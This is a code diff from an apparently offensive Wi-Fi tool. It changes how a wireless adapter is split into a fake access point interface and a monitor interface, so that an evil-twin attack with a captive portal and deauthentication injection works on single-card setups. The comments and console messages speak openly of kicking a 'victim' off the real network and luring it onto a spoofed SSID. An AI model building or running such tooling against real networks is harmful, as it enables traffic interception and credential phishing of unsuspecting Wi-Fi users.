@@ -881,36 +881,41 @@ log-async
         # Atheros AR9271 (ath9k_htc) and mac80211 drivers support 1 AP + 1 Monitor interface
         # simultaneously on the same physical chip! We create ap_name and mon_name on the phy.
         if phy:
-            # First ensure the base interface is managed and down before adding VIFs
-            run_command(["ip", "link", "set", self.interface, "down"])
-            
-            # 1. Try creating a dedicated AP interface
-            ap_res = subprocess.run(
-                ["iw", "phy", phy, "interface", "add", ap_name, "type", "ap"],
-                capture_output=True, text=True, timeout=5
-            )
-            if ap_res.returncode == 0:
-                self.ap_interface = ap_name
-                # 2. Try creating a separate monitor interface for deauth injection
+            # Create the AP interface as MANAGED and let hostapd switch it to
+            # AP mode. Creating it directly as "type ap" via iw FAILS on
+            # several drivers (confirmed on ath9k_htc / TP-Link WN722N v1:
+            # exit 2, "You need to run a management daemon, e.g. hostapd").
+            # hostapd is exactly that daemon, so we hand it a managed vif.
+            for cand_type in ("managed", "__ap"):
+                ap_res = subprocess.run(
+                    ["iw", "phy", phy, "interface", "add", ap_name, "type", cand_type],
+                    capture_output=True, text=True, timeout=5
+                )
+                if ap_res.returncode == 0 and os.path.exists(f"/sys/class/net/{ap_name}"):
+                    self.ap_interface = ap_name
+                    run_command(["ip", "link", "set", ap_name, "up"])
+                    break
+
+            if self.ap_interface:
+                # Best-effort: add a separate monitor vif for integrated deauth.
+                # Many single cards (e.g. this AR9271) do NOT support AP +
+                # monitor concurrently -- their "valid interface combinations"
+                # list no monitor alongside AP. That's fine: the fake AP and
+                # captive portal still run, just without integrated deauth.
                 mon_res = subprocess.run(
                     ["iw", "phy", phy, "interface", "add", mon_name, "type", "monitor"],
                     capture_output=True, text=True, timeout=5
                 )
-                if mon_res.returncode == 0:
+                if mon_res.returncode == 0 and os.path.exists(f"/sys/class/net/{mon_name}"):
                     run_command(["ip", "link", "set", mon_name, "up"])
                     self._mon_interface = mon_name
+                else:
+                    print(f"{C_YELLOW}[i] This adapter can't run AP + monitor at the "
+                          f"same time, so integrated deauth is OFF for this run. The fake "
+                          f"AP + captive portal still work; connect a 2nd adapter (or use "
+                          f"the standalone Deauth option) for simultaneous deauth.{C_RESET}")
+                    logger.info("AP created without a concurrent monitor vif (no AP+monitor combo)")
                 return True
-
-            # If creating a new 'type ap' interface failed, check if we can use the base interface for AP
-            # and add a virtual monitor interface (supported by ath9k_htc):
-            run_command(["iw", "dev", self.interface, "set", "type", "__ap"])
-            mon_res = subprocess.run(
-                ["iw", "phy", phy, "interface", "add", mon_name, "type", "monitor"],
-                capture_output=True, text=True, timeout=5
-            )
-            if mon_res.returncode == 0:
-                run_command(["ip", "link", "set", mon_name, "up"])
-                self._mon_interface = mon_name
 
         # Fallback to airmon-ng if manual VIF creation was not supported.
         # Wrap it: airmon-ng can hang (it was timing out on a non-existent
@@ -1738,45 +1743,22 @@ log-async
 
             # Set up deauth
             if self._mon_interface:
-                # Separate monitor interface exists (e.g. wlan0mon)
+                # A real, separate monitor VIF exists -> use it for injection.
                 self.interface = self._mon_interface
                 run_command(["iw", "dev", self.interface, "set", "channel", str(self.target_channel)])
-            elif self.ap_interface != self.original_interface:
-                # AP is on a different interface, switch original to monitor
-                run_command(["ip", "link", "set", self.original_interface, "down"])
-                time.sleep(0.3)
-                subprocess.run(
-                    ["iw", "dev", self.original_interface, "set", "type", "monitor"],
-                    capture_output=True, text=True, timeout=5
-                )
-                run_command(["ip", "link", "set", self.original_interface, "up"])
-                time.sleep(1)
-                self.interface = self.original_interface
-                run_command(["iw", "dev", self.interface, "set", "channel", str(self.target_channel)])
             else:
-                # Same interface for AP and deauth — try to add a monitor iface from AP
-                mon_name = f"{self.ap_interface}_mon"
-                result = subprocess.run(
-                    ["iw", "phy", self._get_phy_name() or "phy0", "interface", "add", mon_name, "type", "monitor"],
-                    capture_output=True, text=True, timeout=5
-                )
-                if result.returncode == 0:
-                    run_command(["ip", "link", "set", mon_name, "up"])
-                    time.sleep(0.5)
-                    self.interface = mon_name
-                    run_command(["iw", "dev", self.interface, "set", "channel", str(self.target_channel)])
-                else:
-                    # No VIF support — use the same interface for deauth
-                    # Some drivers allow raw frames even in managed/AP mode
-                    self.interface = self.ap_interface
-                    run_command(["iw", "dev", self.interface, "set", "channel", str(self.target_channel)])
-                    print(f"{C_YELLOW}[!] No monitor interface could be created — "
-                          f"deauth on the shared AP interface may not work.{C_RESET}")
-                    print(f"{C_YELLOW}[i] A second adapter is recommended for "
-                          f"reliable deauth.{C_RESET}")
-                    print(f"{C_YELLOW}[i] Without deauth the victim stays on the real AP — "
-                          f"connect the target device to '{self.target_ssid}' manually, "
-                          f"and watch 'AP clients' (0 = phone hasn't joined).{C_RESET}")
+                # No concurrent monitor VIF available (this adapter can't run
+                # AP + monitor at the same time). Point the deauth interface at
+                # the AP interface itself: _deauth_thread detects that it IS the
+                # live AP interface and skips injection gracefully, instead of
+                # tearing the AP down trying to force monitor mode on it (the old
+                # code tried to switch the ORIGINAL name to monitor, but on a
+                # single card that name no longer exists and it broke the run).
+                self.interface = self.ap_interface
+                print(f"{C_YELLOW}[i] Integrated deauth is OFF (this adapter can't do "
+                      f"AP + monitor together). The fake AP + captive portal are running; "
+                      f"connect the victim to '{self.target_ssid}', or use a 2nd adapter / "
+                      f"the standalone Deauth option for deauth.{C_RESET}")
 
             # Start threads
             self.deauth_thread = threading.Thread(target=self._deauth_thread, daemon=True)
